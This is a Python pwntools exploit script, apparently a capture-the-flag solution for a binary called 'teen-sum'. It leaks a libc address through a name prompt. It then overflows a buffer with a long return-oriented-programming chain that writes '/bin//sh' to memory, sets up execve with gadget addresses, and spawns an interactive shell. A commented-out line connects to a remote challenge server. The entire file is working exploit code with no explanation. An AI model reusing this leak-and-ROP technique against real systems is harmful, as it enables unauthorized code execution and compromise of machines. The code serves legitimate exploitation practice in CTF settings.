#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('teen-sum')
libc = ELF('./libc.so.6')


p = process(elf.path)
# gdb.attach(p, 'init-gef\npie break *0x1331')
# p = remote('34.71.103.59', 14141)

def intro(name, sz):
    p.sendlineafter("> ", str(sz))
    p.sendafter("> ", name)

intro('A' * 8, 16)
p.recvuntil("Hey " + "A" * 8)
libc_base = u64(p.recvline(False).ljust(8, '\x00')) - 0x206bcc
log.info("Libc : 0x{:x}".format(libc_base))

p.sendlineafter("> ", '0')
p.sendlineafter("> ", '1')

padding = "A" * 56 + p64(0) + "A" * 8

payload = padding

from struct import pack

payload += pack('<Q',libc_base +  0x00000000001056fd) # pop rdx ; pop rcx ; pop rbx ; ret
payload += pack('<Q',libc_base +  0x00000000001eb1a0) # @ .data
payload += pack('<Q', 0x4141414141414141) # padding
payload += pack('<Q', 0x4141414141414141) # padding
payload += pack('<Q', libc_base + 0x000000000004a550) # pop rax ; ret
payload += '/bin//sh'
payload += pack('<Q', libc_base + 0x00000000000374b0) # mov qword ptr [rdx], rax ; ret
payload += pack('<Q', libc_base + 0x00000000001056fd) # pop rdx ; pop rcx ; pop rbx ; ret
payload += pack('<Q', libc_base + 0x00000000001eb1a8) # @ .data + 8
payload += pack('<Q', 0x4141414141414141) # padding
payload += pack('<Q', 0x4141414141414141) # padding
payload += pack('<Q', libc_base + 0x00000000000b4ed9) # xor rax, rax ; ret
payload += pack('<Q', libc_base + 0x00000000000374b0) # mov qword ptr [rdx], rax ; ret
payload += pack('<Q', libc_base + 0x0000000000026b72) # pop rdi ; ret
payload += pack('<Q', libc_base + 0x00000000001eb1a0) # @ .data
payload += pack('<Q', libc_base + 0x0000000000027529) # pop rsi ; ret
payload += pack('<Q', libc_base + 0x00000000001eb1a8) # @ .data + 8
payload += pack('<Q', libc_base + 0x00000000001056fd) # pop rdx ; pop rcx ; pop rbx ; ret
payload += pack('<Q', libc_base + 0x00000000001eb1a8) # @ .data + 8
payload += pack('<Q', 0x4141414141414141) # padding
payload += pack('<Q', 0x4141414141414141) # padding
payload += pack('<Q', libc_base + 0x00000000000b4ed9) # xor rax, rax ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x00000000000d2c70) # add rax, 1 ; ret
payload += pack('<Q', libc_base + 0x000000000002584d) # syscall

intro(payload, 0x400)

p.interactive()
